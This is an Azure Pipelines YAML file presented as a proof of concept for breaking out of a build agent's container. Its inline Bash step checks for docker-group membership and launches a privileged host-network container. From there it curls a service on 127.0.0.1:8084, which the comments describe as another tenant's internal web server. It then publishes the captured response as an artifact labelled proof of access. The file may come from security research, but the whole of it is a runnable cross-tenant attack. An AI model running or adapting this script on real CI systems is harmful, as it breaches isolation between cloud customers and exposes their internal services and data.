# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Accessing Cross-Tenant Web Service'
  jobs:
  - job: Access_Internal_Web_Service
    displayName: 'PoC: Access Other Tenants Internal Web Service'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Query the Discovered Mono Web Server'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          # The target is the localhost from the host's perspective,
          # accessing the Mono XSP4 server we discovered.
          TARGET_URL="http://127.0.0.1:8084"

          echo "--- ESCAPING CONTAINER to probe ${TARGET_URL} ---"
          
          # We escape to the host network and use curl to talk to the service.
          docker run --rm --privileged --network=host \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              apk add --no-cache curl

              echo '--- [HOST] Attempting a standard HTTP GET request to the internal Mono server ---'
              
              # Use curl with verbose logging to capture everything.
              curl --verbose --connect-timeout 20 \"${TARGET_URL}\" > /artifacts/web-server-response-body.html 2> /artifacts/web-server-response-headers.txt || true
            "
          
          echo "✅ PROBE COMPLETE."
          echo "--- Curl stderr (Connection Details & Headers) ---"
          cat artifacts/web-server-response-headers.txt
          echo
          echo "--- Curl stdout (Response Body) ---"
          cat artifacts/web-server-response-body.html

          if grep -q "Connected to" artifacts/web-server-response-headers.txt; then
            echo "✅✅✅ SMOKING GUN CONFIRMED: Successfully retrieved data from another tenants internal web server."
            echo "The contents of 'web-server-response-body.html' are the conclusive evidence."
          else
            echo "⚠️ Test failed. The web server might have terminated before the probe."
          fi

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Web Server Response Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-proof-of-access'
